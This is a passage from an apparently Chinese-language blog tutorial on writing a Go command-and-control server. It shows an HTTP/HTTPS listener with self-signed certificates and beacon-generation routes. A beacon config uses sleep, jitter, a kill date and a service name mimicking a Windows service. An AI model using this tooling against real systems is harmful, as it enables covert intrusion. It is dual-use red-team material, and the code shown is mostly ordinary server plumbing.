class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> listener  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> (  </span><br><span class="line">    <span class="string">&quot;OneServer/middlewares&quot;</span>  </span><br><span class="line">    <span class="string">&quot;bytes&quot;</span>    </span><br><span class="line">    <span class="string">&quot;crypto/rand&quot;</span>    </span><br><span class="line">    <span class="string">&quot;crypto/rsa&quot;</span>    </span><br><span class="line">    <span class="string">&quot;crypto/x509&quot;</span>    </span><br><span class="line">    <span class="string">&quot;encoding/pem&quot;</span>    </span><br><span class="line">    <span class="string">&quot;errors&quot;</span>    </span><br><span class="line">    <span class="string">&quot;fmt&quot;</span>    </span><br><span class="line">    <span class="string">&quot;github.com/gin-gonic/gin&quot;</span>    </span><br><span class="line">    <span class="string">&quot;math/big&quot;</span>    </span><br><span class="line">    <span class="string">&quot;net/http&quot;</span>    </span><br><span class="line">    <span class="string">&quot;os&quot;</span>    </span><br><span class="line">    <span class="string">&quot;time&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(handler *HTTP)</span></span> Start(ts TeamServer) <span class="type">error</span> &#123;  </span><br><span class="line">    <span class="keyword">var</span> err <span class="type">error</span> = <span class="literal">nil</span>  </span><br><span class="line">  </span><br><span class="line">    gin.SetMode(gin.DebugMode)  </span><br><span class="line">    router := gin.New()  </span><br><span class="line">    router.NoRoute(handler.pageError)  </span><br><span class="line">  </span><br><span class="line">    router.Use(middlewares.ResponseHeaderMiddleware(handler.Config.ResponseHeaders))  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// TODO  </span></span><br><span class="line">    router.GET(handler.Config.URI, handler.processRequest)  </span><br><span class="line">    router.POST(handler.Config.URI, handler.processResponse)  </span><br><span class="line">  </span><br><span class="line">    handler.Active = <span class="literal">true</span>  </span><br><span class="line">  </span><br><span class="line">    handler.Server = &amp;http.Server&#123;  </span><br><span class="line">       Addr:    fmt.Sprintf(<span class="string">&quot;%s:%d&quot;</span>, handler.Config.HostBind, handler.Config.PortBind),  </span><br><span class="line">       Handler: router,  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> handler.Config.SSL &#123;  </span><br><span class="line">       fmt.Printf(<span class="string">&quot;   Started listener: https://%s:%d\n&quot;</span>, handler.Config.HostBind, handler.Config.PortBind)  </span><br><span class="line">  </span><br><span class="line">       listenerPath := <span class="string">&quot;/static&quot;</span>  </span><br><span class="line">       _, err = os.Stat(listenerPath)  </span><br><span class="line">       <span class="keyword">if</span> os.IsNotExist(err) &#123;  </span><br><span class="line">          err = os.Mkdir(listenerPath, os.ModePerm)  </span><br><span class="line">          <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">             <span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;failed to create %s folder: %s&quot;</span>, listenerPath, err.Error())  </span><br><span class="line">          &#125;  </span><br><span class="line">       &#125;  </span><br><span class="line">  </span><br><span class="line">       handler.Config.SSLCertPath = listenerPath + <span class="string">&quot;/listener.crt&quot;</span>  </span><br><span class="line">       handler.Config.SSLKeyPath = listenerPath + <span class="string">&quot;/listener.key&quot;</span>  </span><br><span class="line">  </span><br><span class="line">       <span class="keyword">if</span> <span class="built_in">len</span>(handler.Config.SSLCert) == <span class="number">0</span> || <span class="built_in">len</span>(handler.Config.SSLKey) == <span class="number">0</span> &#123;  </span><br><span class="line">          err = handler.generateSelfSignedCert(handler.Config.SSLCertPath, handler.Config.SSLKeyPath)  </span><br><span class="line">          <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">             handler.Active = <span class="literal">false</span>  </span><br><span class="line">             fmt.Println(<span class="string">&quot;Error generating self-signed certificate:&quot;</span>, err)  </span><br><span class="line">             <span class="keyword">return</span> err  </span><br><span class="line">          &#125;  </span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">          err = os.WriteFile(handler.Config.SSLCertPath, handler.Config.SSLCert, <span class="number">0600</span>)  </span><br><span class="line">          <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">             <span class="keyword">return</span> err  </span><br><span class="line">          &#125;  </span><br><span class="line">          err = os.WriteFile(handler.Config.SSLKeyPath, handler.Config.SSLKey, <span class="number">0600</span>)  </span><br><span class="line">          <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">             <span class="keyword">return</span> err  </span><br><span class="line">          &#125;  </span><br><span class="line">       &#125;  </span><br><span class="line">  </span><br><span class="line">       <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;  </span><br><span class="line">          err = handler.Server.ListenAndServeTLS(handler.Config.SSLCertPath, handler.Config.SSLKeyPath)  </span><br><span class="line">          <span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; !errors.Is(err, http.ErrServerClosed) &#123;  </span><br><span class="line">             fmt.Printf(<span class="string">&quot;Error starting HTTPS server: %v\n&quot;</span>, err)  </span><br><span class="line">             <span class="keyword">return</span>  </span><br><span class="line">          &#125;  </span><br><span class="line">          handler.Active = <span class="literal">true</span>  </span><br><span class="line">       &#125;()  </span><br><span class="line">  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">       fmt.Printf(<span class="string">&quot;   Started listener: http://%s:%d\n&quot;</span>, handler.Config.HostBind, handler.Config.PortBind)  </span><br><span class="line">  </span><br><span class="line">       <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;  </span><br><span class="line">          err = handler.Server.ListenAndServe()  </span><br><span class="line">          <span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; !errors.Is(err, http.ErrServerClosed) &#123;  </span><br><span class="line">             fmt.Printf(<span class="string">&quot;Error starting HTTP server: %v\n&quot;</span>, err)  </span><br><span class="line">             <span class="keyword">return</span>  </span><br><span class="line">          &#125;  </span><br><span class="line">          handler.Active = <span class="literal">true</span>  </span><br><span class="line">       &#125;()  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    time.Sleep(<span class="number">500</span> * time.Millisecond)  </span><br><span class="line">    <span class="keyword">return</span> err  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(handler *HTTP)</span></span> processRequest(ctx *gin.Context) &#123;  </span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> Implement processing of requests  &#125;  </span></span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(handler *HTTP)</span></span> processResponse(ctx *gin.Context) &#123;  </span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> Implement processing of Response  &#125;  </span></span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(handler *HTTP)</span></span> generateSelfSignedCert(certFile, keyFile <span class="type">string</span>) <span class="type">error</span> &#123;  </span><br><span class="line">    <span class="keyword">var</span> (  </span><br><span class="line">       certData   []<span class="type">byte</span>  </span><br><span class="line">       keyData    []<span class="type">byte</span>  </span><br><span class="line">       certBuffer bytes.Buffer  </span><br><span class="line">       keyBuffer  bytes.Buffer  </span><br><span class="line">       privateKey *rsa.PrivateKey  </span><br><span class="line">       err        <span class="type">error</span>  </span><br><span class="line">    )  </span><br><span class="line">  </span><br><span class="line">    privateKey, err = rsa.GenerateKey(rand.Reader, <span class="number">2048</span>)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;failed to generate private key: %v&quot;</span>, err)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    serialNumberLimit := <span class="built_in">new</span>(big.Int).Lsh(big.NewInt(<span class="number">1</span>), <span class="number">128</span>)  </span><br><span class="line">    serialNumber, err := rand.Int(rand.Reader, serialNumberLimit)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;failed to generate serial number: %v&quot;</span>, err)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    template := x509.Certificate&#123;  </span><br><span class="line">       SerialNumber: serialNumber,  </span><br><span class="line">       NotBefore:    time.Now(),  </span><br><span class="line">       NotAfter:     time.Now().Add(<span class="number">365</span> * <span class="number">24</span> * time.Hour),  </span><br><span class="line">  </span><br><span class="line">       KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,  </span><br><span class="line">       ExtKeyUsage:           []x509.ExtKeyUsage&#123;x509.ExtKeyUsageServerAuth&#125;,  </span><br><span class="line">       BasicConstraintsValid: <span class="literal">true</span>,  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    template.DNSNames = []<span class="type">string</span>&#123;handler.Config.HostBind&#125;  </span><br><span class="line">  </span><br><span class="line">    certData, err = x509.CreateCertificate(rand.Reader, &amp;template, &amp;template, &amp;privateKey.PublicKey, privateKey)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;failed to create certificate: %v&quot;</span>, err)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    err = pem.Encode(&amp;certBuffer, &amp;pem.Block&#123;Type: <span class="string">&quot;CERTIFICATE&quot;</span>, Bytes: certData&#125;)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;failed to write certificate: %v&quot;</span>, err)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    handler.Config.SSLCert = certBuffer.Bytes()  </span><br><span class="line">    err = os.WriteFile(certFile, handler.Config.SSLCert, <span class="number">0644</span>)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;failed to create certificate file: %v&quot;</span>, err)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    keyData = x509.MarshalPKCS1PrivateKey(privateKey)  </span><br><span class="line">    err = pem.Encode(&amp;keyBuffer, &amp;pem.Block&#123;Type: <span class="string">&quot;RSA PRIVATE KEY&quot;</span>, Bytes: keyData&#125;)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;failed to write private key: %v&quot;</span>, err)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    handler.Config.SSLKey = keyBuffer.Bytes()  </span><br><span class="line">    err = os.WriteFile(keyFile, handler.Config.SSLKey, <span class="number">0644</span>)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;failed to create key file: %v&quot;</span>, err)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(handler *HTTP)</span></span> pageError(ctx *gin.Context) &#123;  </span><br><span class="line">    ctx.Writer.WriteHeader(http.StatusNotFound)  </span><br><span class="line">    html := []<span class="type">byte</span>(handler.Config.PageError)  </span><br><span class="line">    _, _ = ctx.Writer.Write(html)  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>middlewares/ResponseHeader.go</code>：把自定义响应头一次性注入到所有后续处理函数</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> middlewares  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;github.com/gin-gonic/gin&quot;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ResponseHeaderMiddleware</span><span class="params">(headers <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span>)</span></span> gin.HandlerFunc &#123;  </span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;  </span><br><span class="line">       <span class="keyword">for</span> k, v := <span class="keyword">range</span> headers &#123;  </span><br><span class="line">          c.Header(k, v)  </span><br><span class="line">       &#125;  </span><br><span class="line">       c.Next()  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-3-接口测试"><a href="#2-3-接口测试" class="headerlink" title="2.3 接口测试"></a>2.3 接口测试</h2><p>ok，这一部分的代码就编写到这里，我们重新启动服务器，测试接口是正常</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go run main.go</span><br></pre></td></tr></table></figure>

<p>或者使用IDE运行</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/07/27/19-36-11-1b8413616427860edad117b3734d309e-20250727193610-a133d3.png"></p>
<h1 id="三、生成Beacon"><a href="#三、生成Beacon" class="headerlink" title="三、生成Beacon"></a>三、生成Beacon</h1><h2 id="3-1-大致流程"><a href="#3-1-大致流程" class="headerlink" title="3.1 大致流程"></a>3.1 大致流程</h2><p>大致流程：</p>
<ol>
<li><code>controller.InitRouter</code>：注册一条路由”&#x2F;agent&#x2F;generate”，并由controller.BeaconGenerate处理。</li>
<li><code>controller.BeaconGenerate</code>：绑定参数，查询监听器配置，调用 <code>BeaconGenerate</code> 生成二进制，把文件名和内容用 Base64 打包回前端。</li>
<li><code>TeamServer.ListenerGetConfig</code>：先判断监听器是否存在，再从map中取出对应的 <code>ListenerData</code> 并返回其 <code>Data</code> 字段（即 <code>ConfigDetail</code>）。</li>
<li><code>TeamServer.BeaconGenerate</code>：</li>
<li><code>Handler.BeaconGenerate</code>：根据 <code>beaconConfig.BeaconType</code> 找到对应的 <code>beaconHandler</code>，然后把参数透传给它的 <code>BeaconGenerate</code> 方法并返回结果。</li>
<li><code>BeaconHandler.BeaconGenerate</code>：首先调用BeaconGenerateProfile获得beacon的配置，再调用BeaconBuild生成beacon可执行文件。</li>
<li><code>BeaconHandler.BeaconGenerateProfile</code>：生成beacon的配置信息，改信息是由两个结构体组合而成。</li>
<li><code>BeaconHandler.BeaconBuild</code>：将配置信息patch到用于测试模板文件，并将patch后的文件输出。本项目写到后面其实是硬编码配置到beacon里，这是为了方便调试，因为精力实在有限，所以没测试patch完整的beacon，感兴趣的师傅可以去尝试一下。</li>
</ol>
<p>据我所知生成Beacon的方式一共有两大类型：</p>
<ol>
<li><strong>通过编译器编译生成</strong>：通过编译器将<strong>源代码</strong>编译成可执行文件。这种方式的优点是可以生成完全自定义的Beacon，支持多种平台和架构，缺点是需要完整的编译环境和源代码。常见的做法是在编译的时候将配置放到C&#x2F;C++的宏中。</li>
<li><strong>Patch生成</strong>：在<strong>模板可执行文件</strong>的基础上，通过修改配置文件或直接修改二进制文件来生成Beacon。这种方式的优点是不需要完整的编译环境，生成速度快，缺点是灵活性较低，通常只能修改配置信息，不能修改逻辑。</li>
</ol>
<table>
<thead>
<tr>
<th align="left">特性</th>
<th align="left">编译生成</th>
<th align="left">Patch 生成</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>灵活性</strong></td>
<td align="left">高（可以完全自定义逻辑）</td>
<td align="left">低（只能修改配置信息）</td>
</tr>
<tr>
<td align="left"><strong>生成速度</strong></td>
<td align="left">慢（需要编译）</td>
<td align="left">快（只需修改配置）</td>
</tr>
<tr>
<td align="left"><strong>依赖</strong></td>
<td align="left">需要编译环境和源代码</td>
<td align="left">不需要编译环境，只需模板文件</td>
</tr>
<tr>
<td align="left"><strong>适用场景</strong></td>
<td align="left">开发阶段、需要高度自定义</td>
<td align="left">生产阶段、快速生成</td>
</tr>
</tbody></table>
<p>在本项目中，我选择的是Patch生成Beacon，还有我看很少有C2通过patch生成，我的这个patch方式只适用于go写的beacon（理论上只要支持json反序列化的语言都可行），更通用的方式就是通过将配置信息用自己的打包器打包，与下文打包任务包类似，就不再这里介绍了。</p>
<p>beacon的json配置</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;listener_name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http_listener_01&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;listener_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Beacon-HTTP&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;beacon_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Beacon&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;config&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;arch&quot;</span><span class="punctuation">:</span><span class="string">&quot;x64&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;os&quot;</span><span class="punctuation">:</span><span class="string">&quot;windows&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;format&quot;</span><span class="punctuation">:</span><span class="string">&quot;exe&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;sleep&quot;</span><span class="punctuation">:</span><span class="number">10</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;jitter&quot;</span><span class="punctuation">:</span><span class="number">20</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;svcname&quot;</span><span class="punctuation">:</span><span class="string">&quot;WaaSMedicSvc&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;is_killdate&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;kill_date&quot;</span><span class="punctuation">:</span><span class="string">&quot;2025-12-31&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;kill_time&quot;</span><span class="punctuation">:</span><span class="string">&quot;23:59:59&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;is_workingtime&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;start_time&quot;</span><span class="punctuation">:</span><span class="string">&quot;09:00&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;end_time&quot;</span><span class="punctuation">:</span><span class="string">&quot;18:00&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="3-2-代码编写"><a href="#3-2-代码编写" class="headerlink" title="3.2 代码编写"></a>3.2 代码编写</h2><p><code>controller/controller.go</code> 增加一条”&#x2F;beacon&#x2F;generate”路由</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *Controller)</span></span> InitRouter() &#123;  </span><br><span class="line">  </span><br><span class="line">    apiGroup := c.Engine.Group(c.Endpoint)  </span><br><span class="line">  </span><br><span class="line">    apiGroup.GET(<span class="string">&quot;/test&quot;</span>, c.Test)  </span><br><span class="line">    apiGroup.POST(<span class="string">&quot;/listener/create&quot;</span>, c.ListenerStart)  </span><br><span class="line">    apiGroup.POST(<span class="string">&quot;/beacon/generate&quot;</span>, c.BeaconGenerate)  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>controller/types.go</code> controller需要用到TeamServer的ListenerGetConfig和BeaconGenerate方法，所以在接口处定义</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> TeamServer <span class="keyword">interface</span> &#123;  </span><br><span class="line">    ListenerStart(listenerName <span class="type">string</span>, configType <span class="type">string</span>, config request.ConfigDetail) <span class="type">error</span>  </span><br><span class="line">    ListenerGetConfig(listenerName <span class="type">string</span>, configType <span class="type">string</span>) (request.ConfigDetail, <span class="type">error</span>)  </span><br><span class="line">    BeaconGenerate(beaconConfig request.BeaconConfig, listenerConfig request.ConfigDetail) ([]<span class="type">byte</span>, <span class="type">string</span>, <span class="type">error</span>)  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>utils/request/beacon.go</code>：前端传过来json的数据绑定到BeaconConfig结构体中</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> request  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">type</span> BeaconConfig <span class="keyword">struct</span> &#123;  </span><br><span class="line">    ListenerName <span class="type">string</span>         <span class="string">`json:&quot;listener_name&quot;`</span>  </span><br><span class="line">    ListenerType <span class="type">string</span>         <span class="string">`json:&quot;listener_type&quot;`</span>  </span><br><span class="line">    BeaconType   <span class="type">string</span>         <span class="string">`json:&quot;beacon_type&quot;`</span>  </span><br><span class="line">    Config       GenerateConfig <span class="string">`json:&quot;config&quot;`</span>  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">type</span> GenerateConfig <span class="keyword">struct</span> &#123;  </span><br><span class="line">    Os            <span class="type">string</span> <span class="string">`json:&quot;os&quot;`</span>  </span><br><span class="line">    Arch          <span class="type">string</span> <span class="string">`json:&quot;arch&quot;`</span>  </span><br><span class="line">    Format        <span class="type">string</span> <span class="string">`json:&quot;format&quot;`</span>  </span><br><span class="line">    Sleep         <span class="type">int</span>    <span class="string">`json:&quot;sleep&quot;`</span>  </span><br><span class="line">    Jitter        <span class="type">int</span>    <span class="string">`json:&quot;jitter&quot;`</span>  </span><br><span class="line">    SvcName       <span class="type">string</span> <span class="string">`json:&quot;svcname&quot;`</span>  </span><br><span class="line">    IsKillDate    <span class="type">bool</span>   <span class="string">`json:&quot;is_killdate&quot;`</span>  </span><br><span class="line">    Killdate      <span class="type">string</span> <span class="string">`json:&quot;kill_date&quot;`</span>  </span><br><span class="line">    Killtime      <span class="type">string</span> <span class="string">`json:&quot;kill_time&quot;`</span>  </span><br><span class="line">    IsWorkingTime <span class="type">bool</span>   <span class="string">`json:&quot;is_workingtime&quot;`</span>  </span><br><span class="line">    StartTime     <span class="type">string</span> <span class="string">`json:&quot;start_time&quot;`</span>  </span><br><span class="line">    EndTime       <span class="type">string</span> <span class="string">`json:&quot;end_time&quot;`</span>  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>utils/response/beacon.go</code>：响应给前端的结构体BeaconFile</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> response  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">type</span> BeaconFile <span class="keyword">struct</span> &#123;  </span><br><span class="line">    FileName    <span class="type">string</span> <span class="string">`json:&quot;name&quot;`</span>  </span><br><span class="line">    FileContent <span class="type">string</span> <span class="string">`json:&quot;file_content&quot;`</span>  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>controller/beacon.go</code> 绑定参数，查询监听器配置，调用 <code>BeaconGenerate</code> 生成二进制，把文件名和内容用 Base64 打包回前端。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> controller  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> (  </span><br><span class="line">    <span class="string">&quot;OneServer/logs&quot;</span>  </span><br><span class="line">    <span class="string">&quot;OneServer/utils/request&quot;</span>    </span><br><span class="line">    <span class="string">&quot;OneServer/utils/response&quot;</span>    </span><br><span class="line">    <span class="string">&quot;encoding/base64&quot;</span>    </span><br><span class="line">    <span class="string">&quot;github.com/gin-gonic/gin&quot;</span>    </span><br><span class="line">    <span class="string">&quot;go.uber.org/zap&quot;</span>    </span><br><span class="line">    <span class="string">&quot;net/http&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *Controller)</span></span> BeaconGenerate(ctx *gin.Context) &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">var</span> (  </span><br><span class="line">       beaconConfig   request.BeaconConfig  </span><br><span class="line">       listenerConfig request.ConfigDetail  </span><br><span class="line">       err            <span class="type">error</span>  </span><br><span class="line">    )  </span><br><span class="line">  </span><br><span class="line">    err = ctx.ShouldBindJSON(&amp;beaconConfig)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       logs.Logger.Error(<span class="string">&quot;Error in binding JSON data: &quot;</span>, zap.Error(err))  </span><br><span class="line">       ctx.JSON(http.StatusBadRequest, gin.H&#123;<span class="string">&quot;code&quot;</span>: <span class="literal">false</span>, <span class="string">&quot;message&quot;</span>: err.Error()&#125;)  </span><br><span class="line">       <span class="keyword">return</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    listenerConfig, err = c.TeamServer.ListenerGetConfig(beaconConfig.ListenerName, beaconConfig.ListenerType)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       logs.Logger.Error(<span class="string">&quot;Error in getting listener config: &quot;</span>, zap.Error(err))  </span><br><span class="line">       ctx.JSON(http.StatusOK, gin.H&#123;<span class="string">&quot;code&quot;</span>: <span class="literal">false</span>, <span class="string">&quot;message&quot;</span>: err.Error()&#125;)  </span><br><span class="line">       <span class="keyword">return</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    fileContent, fileName, err := c.TeamServer.BeaconGenerate(beaconConfig, listenerConfig)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       logs.Logger.Error(<span class="string">&quot;Error in generating beacon: &quot;</span>, zap.Error(err))  </span><br><span class="line">       ctx.JSON(http.StatusOK, gin.H&#123;<span class="string">&quot;code&quot;</span>: <span class="literal">false</span>, <span class="string">&quot;message&quot;</span>: err.Error()&#125;)  </span><br><span class="line">       <span class="keyword">return</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    